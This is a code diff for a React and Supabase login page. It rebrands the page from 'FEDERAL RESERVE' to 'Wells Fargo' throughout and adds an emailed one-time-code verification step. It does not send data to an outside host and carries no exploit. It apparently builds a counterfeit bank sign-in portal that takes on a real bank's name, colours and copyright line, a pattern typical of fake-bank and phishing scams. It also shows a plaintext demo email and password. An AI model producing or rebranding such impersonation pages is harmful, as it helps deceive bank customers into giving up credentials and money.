@@ -12,8 +12,8 @@ export const Route = createFileRoute("/")({
   component: LoginPage,
   head: () => ({
     meta: [
-      { title: "Sign in — FEDERAL RESERVE" },
-      { name: "description", content: "Securely sign in to your FEDERAL RESERVE accounts." },
+      { title: "Sign in — Wells Fargo" },
+      { name: "description", content: "Securely sign in to your Wells Fargo accounts." },
     ],
   }),
   beforeLoad: async () => {
@@ -27,7 +27,7 @@ function Logo({ className = "" }: { className?: string }) {
   return (
     <div className={`flex items-center gap-2 ${className}`}>
       <img src="/logo.png" alt="Logo" className="h-12 w-12 shrink-0 object-contain sm:h-14 sm:w-14" />
-      <span className="text-xl font-extrabold tracking-tight text-[#D71E28]">FEDERAL RESERVE</span>
+      <span className="text-xl font-extrabold tracking-tight text-[#D71E28]">Wells Fargo</span>
     </div>
   );
 }
@@ -47,12 +47,23 @@ function LoginPage() {
   const [info, setInfo] = useState<string | null>(null);
   const [fieldErrors, setFieldErrors] = useState<{ email?: string; password?: string }>({});
 
+  // Email code (one-time passcode) step
+  const [step, setStep] = useState<"credentials" | "code">("credentials");
+  const [code, setCode] = useState("");
+  const [cooldown, setCooldown] = useState(0);
+
   useEffect(() => {
     const interval = setInterval(() => {
       setCurrentSlide((prev) => (prev + 1) % heroImages.length);
     }, 5000);
     return () => clearInterval(interval);
   }, []);
+
+  useEffect(() => {
+    if (cooldown <= 0) return;
+    const t = setTimeout(() => setCooldown((c) => c - 1), 1000);
+    return () => clearTimeout(t);
+  }, [cooldown]);
 
   function validateEmail(value: string) {
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -79,10 +90,46 @@ function LoginPage() {
     setMode(prev => prev === "signin" ? "signup" : "signin");
   }
 
+  async function verifyCode() {
+    if (!code.trim()) return setError("Enter the code from your email.");
+    setLoading(true);
+    const { error } = await supabase.auth.verifyOtp({
+      email: email.trim(),
+      token: code.trim(),
+      type: "email",
+    });
+    setLoading(false);
+    if (error) return setError(error.message);
+    navigate({ to: "/dashboard" });
+  }
+
+  async function resendCode() {
+    setError(null);
+    const { error } = await supabase.auth.signInWithOtp({
+      email: email.trim(),
+      options: { shouldCreateUser: false },
+    });
+    if (error) return setError(error.message);
+    setCooldown(60);
+    setInfo(`A new code was sent to ${email.trim()}.`);
+  }
+
+  function backToCredentials() {
+    setStep("credentials");
+    setCode("");
+    setError(null);
+    setInfo(null);
+    setPassword("");
+  }
+
   async function onSubmit(e: React.FormEvent) {
     e.preventDefault();
     setError(null);
     setInfo(null);
+
+    // Step 2: verify the emailed code
+    if (step === "code") return verifyCode();
+
     const emailError = validateEmail(email);
     const passwordError = mode === "signup" ? validatePassword(password) : password ? undefined : "Password is required.";
     setFieldErrors({ email: emailError, password: passwordError });
@@ -90,10 +137,25 @@ function LoginPage() {
 
     setLoading(true);
     if (mode === "signin") {
-      const { error } = await supabase.auth.signInWithPassword({ email, password });
+      // Step 1: check the password, then drop the session so the code is required
+      const { error } = await supabase.auth.signInWithPassword({ email: email.trim(), password });
+      if (error) {
+        setLoading(false);
+        return setError(error.message);
+      }
+      await supabase.auth.signOut();
+
+      // Email a one-time code
+      const { error: otpError } = await supabase.auth.signInWithOtp({
+        email: email.trim(),
+        options: { shouldCreateUser: false },
+      });
       setLoading(false);
-      if (error) return setError(error.message);
-      navigate({ to: "/dashboard" });
+      if (otpError) return setError(otpError.message);
+      setCode("");
+      setCooldown(60);
+      setStep("code");
+      setInfo(`We sent a code to ${email.trim()}.`);
       return;
     }
     const { data, error } = await supabase.auth.signUp({
@@ -153,71 +215,102 @@ function LoginPage() {
           {/* Card */}
           <form onSubmit={onSubmit} className="mx-auto w-full max-w-md rounded-2xl bg-white p-8 shadow-2xl">
             <div className="flex flex-col items-center">
-              <img src="/logo.png" alt="FEDERAL RESERVE" className="h-28 w-28 object-contain" />
-              {mode === "signin" ? (
+              <img src="/logo.png" alt="Wells Fargo" className="h-28 w-28 object-contain" />
+              {step === "code" ? (
+                <>
+                  <h3 className="mt-3 text-2xl font-bold text-slate-900">Verify it's you</h3>
+                  <p className="text-center text-sm text-slate-500">Enter the code we emailed you to finish signing in</p>
+                </>
+              ) : mode === "signin" ? (
                 <>
                   <h3 className="mt-3 text-2xl font-bold text-slate-900">Welcome to</h3>
-                  <h2 className="text-3xl font-extrabold text-[#D71E28]">FEDERAL RESERVE</h2>
+                  <h2 className="text-3xl font-extrabold text-[#D71E28]">Wells Fargo</h2>
                 </>
               ) : (
                 <>
                   <h3 className="mt-3 text-2xl font-bold text-slate-900">Create your account</h3>
-                  <p className="text-sm text-slate-500">Sign up to get started with FEDERAL RESERVE</p>
+                  <p className="text-sm text-slate-500">Sign up to get started with Wells Fargo</p>
                 </>
               )}
             </div>
 
             <div className="mt-6 space-y-4">
-              <div>
-                <label className="text-sm font-medium text-slate-700">Email or Username</label>
-                <div className={`mt-1 flex items-center rounded-lg border px-3 focus-within:border-[#D71E28] ${fieldErrors.email ? "border-red-400 bg-red-50/50" : "border-slate-200"}`}>
-                  <User className="h-4 w-4 text-slate-400" />
-                  <input
-                    type="text" inputMode="email" autoComplete="email" value={email}
-                    onChange={(e) => { setEmail(e.target.value); setFieldErrors(prev => ({ ...prev, email: undefined })); }}
-                    placeholder="Enter your email or username"
-                    className="w-full bg-transparent px-2 py-2.5 text-sm outline-none placeholder:text-slate-400"
-                  />
-                </div>
-                {fieldErrors.email && <p className="mt-1 text-xs text-red-600">{fieldErrors.email}</p>}
-              </div>
+              {step === "credentials" ? (
+                <>
+                  <div>
+                    <label className="text-sm font-medium text-slate-700">Email or Username</label>
+                    <div className={`mt-1 flex items-center rounded-lg border px-3 focus-within:border-[#D71E28] ${fieldErrors.email ? "border-red-400 bg-red-50/50" : "border-slate-200"}`}>
+                      <User className="h-4 w-4 text-slate-400" />
+                      <input
+                        type="text" inputMode="email" autoComplete="email" value={email}
+                        onChange={(e) => { setEmail(e.target.value); setFieldErrors(prev => ({ ...prev, email: undefined })); }}
+                        placeholder="Enter your email or username"
+                        className="w-full bg-transparent px-2 py-2.5 text-sm outline-none placeholder:text-slate-400"
+                      />
+                    </div>
+                    {fieldErrors.email && <p className="mt-1 text-xs text-red-600">{fieldErrors.email}</p>}
+                  </div>
 
-              <div>
-                <label className="text-sm font-medium text-slate-700">Password</label>
-                <div className={`mt-1 flex items-center rounded-lg border px-3 focus-within:border-[#D71E28] ${fieldErrors.password ? "border-red-400 bg-red-50/50" : "border-slate-200"}`}>
-                  <Lock className="h-4 w-4 text-slate-400" />
-                  <input
-                    type={showPw ? "text" : "password"} autoComplete={mode === "signin" ? "current-password" : "new-password"} value={password}
-                    onChange={(e) => { setPassword(e.target.value); setFieldErrors(prev => ({ ...prev, password: undefined })); }}
-                    placeholder={mode === "signin" ? "Enter your password" : "Create a password (min 8 chars, mixed case, number, symbol)"}
-                    className="w-full bg-transparent px-2 py-2.5 text-sm outline-none placeholder:text-slate-400"
-                  />
-                  <button type="button" onClick={() => setShowPw(v => !v)} className="text-slate-400 hover:text-slate-600">
-                    {showPw ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
+                  <div>
+                    <label className="text-sm font-medium text-slate-700">Password</label>
+                    <div className={`mt-1 flex items-center rounded-lg border px-3 focus-within:border-[#D71E28] ${fieldErrors.password ? "border-red-400 bg-red-50/50" : "border-slate-200"}`}>
+                      <Lock className="h-4 w-4 text-slate-400" />
+                      <input
+                        type={showPw ? "text" : "password"} autoComplete={mode === "signin" ? "current-password" : "new-password"} value={password}
+                        onChange={(e) => { setPassword(e.target.value); setFieldErrors(prev => ({ ...prev, password: undefined })); }}
+                        placeholder={mode === "signin" ? "Enter your password" : "Create a password (min 8 chars, mixed case, number, symbol)"}
+                        className="w-full bg-transparent px-2 py-2.5 text-sm outline-none placeholder:text-slate-400"
+                      />
+                      <button type="button" onClick={() => setShowPw(v => !v)} className="text-slate-400 hover:text-slate-600">
+                        {showPw ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
+                      </button>
+                    </div>
+                    {fieldErrors.password && <p className="mt-1 text-xs text-red-600">{fieldErrors.password}</p>}
+                    {mode === "signup" && password && !validatePassword(password) && (
+                      <p className="mt-1 text-xs text-emerald-600">Password meets all requirements.</p>
+                    )}
+                    {mode === "signup" && password && (
+                      <ul className="mt-1 space-y-0.5 text-xs text-slate-500">
+                        <li className={password.length >= 8 ? "text-emerald-600" : ""}>• At least 8 characters</li>
+                        <li className={/[A-Z]/.test(password) ? "text-emerald-600" : ""}>• One uppercase letter</li>
+                        <li className={/[a-z]/.test(password) ? "text-emerald-600" : ""}>• One lowercase letter</li>
+                        <li className={/[0-9]/.test(password) ? "text-emerald-600" : ""}>• One number</li>
+                        <li className={/[^A-Za-z0-9]/.test(password) ? "text-emerald-600" : ""}>• One special character</li>
+                      </ul>
+                    )}
+                  </div>
+
+                  {mode === "signin" && (
+                    <div className="flex items-center justify-between text-sm">
+                      <label className="flex items-center gap-2 text-slate-600">
+                        <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="h-4 w-4 rounded border-slate-300" />
+                        Remember Me
+                      </label>
+                      <a href="#" className="font-medium text-[#D71E28] hover:underline">Forgot Password?</a>
+                    </div>
+                  )}
+                </>
+              ) : (
+                <div>
+                  <label className="text-sm font-medium text-slate-700">Verification code</label>
+                  <div className="mt-1 flex items-center rounded-lg border border-slate-200 px-3 focus-within:border-[#D71E28]">
+                    <ShieldCheck className="h-4 w-4 text-slate-400" />
+                    <input
+                      type="text" inputMode="numeric" autoComplete="one-time-code" maxLength={10} autoFocus
+                      value={code}
+                      onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
+                      placeholder="Enter the code from your email"
+                      className="w-full bg-transparent px-2 py-2.5 text-sm tracking-widest outline-none placeholder:tracking-normal placeholder:text-slate-400"
+                    />
+                  </div>
+                  <button
+                    type="button"
+                    onClick={resendCode}
+                    disabled={cooldown > 0}
+                    className="mt-2 text-xs font-medium text-[#D71E28] hover:underline disabled:text-slate-400 disabled:no-underline"
+                  >
+                    {cooldown > 0 ? `Resend code in ${cooldown}s` : "Resend code"}
                   </button>
-                </div>
-                {fieldErrors.password && <p className="mt-1 text-xs text-red-600">{fieldErrors.password}</p>}
-                {mode === "signup" && password && !validatePassword(password) && (
-                  <p className="mt-1 text-xs text-emerald-600">Password meets all requirements.</p>
-                )}
-                {mode === "signup" && password && (
-                  <ul className="mt-1 space-y-0.5 text-xs text-slate-500">
-                    <li className={password.length >= 8 ? "text-emerald-600" : ""}>• At least 8 characters</li>
-                    <li className={/[A-Z]/.test(password) ? "text-emerald-600" : ""}>• One uppercase letter</li>
-                    <li className={/[a-z]/.test(password) ? "text-emerald-600" : ""}>• One lowercase letter</li>
-                    <li className={/[0-9]/.test(password) ? "text-emerald-600" : ""}>• One number</li>
-                    <li className={/[^A-Za-z0-9]/.test(password) ? "text-emerald-600" : ""}>• One special character</li>
-                  </ul>
-                )}
-              </div>
-
-              {mode === "signin" && (
-                <div className="flex items-center justify-between text-sm">
-                  <label className="flex items-center gap-2 text-slate-600">
-                    <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="h-4 w-4 rounded border-slate-300" />
-                    Remember Me
-                  </label>
-                  <a href="#" className="font-medium text-[#D71E28] hover:underline">Forgot Password?</a>
                 </div>
               )}
 
@@ -227,7 +320,11 @@ function LoginPage() {
               <button type="submit" disabled={loading}
                 className="flex w-full items-center justify-center gap-2 rounded-lg bg-[#D71E28] py-3 text-sm font-semibold text-white shadow-lg shadow-[#D71E28]/30 transition hover:bg-[#A3141C] disabled:opacity-60">
                 <Lock className="h-4 w-4" />
-                {loading ? (mode === "signin" ? "Signing in…" : "Creating account…") : (mode === "signin" ? "Sign In" : "Create Account")}
+                {step === "code"
+                  ? (loading ? "Verifying…" : "Verify Code")
+                  : loading
+                    ? (mode === "signin" ? "Signing in…" : "Creating account…")
+                    : (mode === "signin" ? "Sign In" : "Create Account")}
               </button>
 
               <div className="flex items-center gap-3 text-xs text-slate-400">
@@ -236,12 +333,11 @@ function LoginPage() {
 
               <button
                 type="button"
-                onClick={toggleMode}
+                onClick={step === "code" ? backToCredentials : toggleMode}
                 className="w-full rounded-lg border border-[#D71E28] py-3 text-sm font-semibold text-[#D71E28] hover:bg-[#D71E28]/5"
               >
-                {mode === "signin" ? "Create Account" : "Back to Sign In"}
+                {step === "code" ? "Back" : mode === "signin" ? "Create Account" : "Back to Sign In"}
               </button>
-
 
               <div className="rounded-lg bg-slate-50 p-3 text-xs text-slate-500">
                 Demo: <code className="font-mono">Christucker@gmail.com</code> / <code className="font-mono">@12340</code>
@@ -261,7 +357,7 @@ function LoginPage() {
 
           <div className="flex flex-col justify-center text-white">
             <h1 className="text-3xl font-light md:text-4xl">Welcome back to</h1>
-            <h2 className="mt-1 text-4xl font-bold md:text-5xl">FEDERAL RESERVE</h2>
+            <h2 className="mt-1 text-4xl font-bold md:text-5xl">Wells Fargo</h2>
             <div className="mt-3 h-1 w-16 rounded bg-[#FF4D57]" />
             <p className="mt-6 max-w-md text-white/90">
               Securely access your accounts, transfer funds, pay bills, and manage your finances all in one place.
@@ -296,7 +392,7 @@ function LoginPage() {
       <footer className="border-t border-slate-100 bg-white">
         <div className="mx-auto flex max-w-7xl flex-wrap items-center justify-center gap-x-4 gap-y-2 px-6 py-4 text-xs text-slate-500">
           <span className="flex items-center gap-1"><Lock className="h-3 w-3" /> SSL Secured</span>
-          <span>|</span><span>© 2026 FEDERAL RESERVE. All rights reserved.</span>
+          <span>|</span><span>© 2026 Wells Fargo. All rights reserved.</span>
           <span>|</span><a href="#" className="text-[#D71E28]">Privacy Policy</a>
           <a href="#" className="text-[#D71E28]">Terms of Use</a>
           <a href="#" className="text-[#D71E28]">Security Center</a>
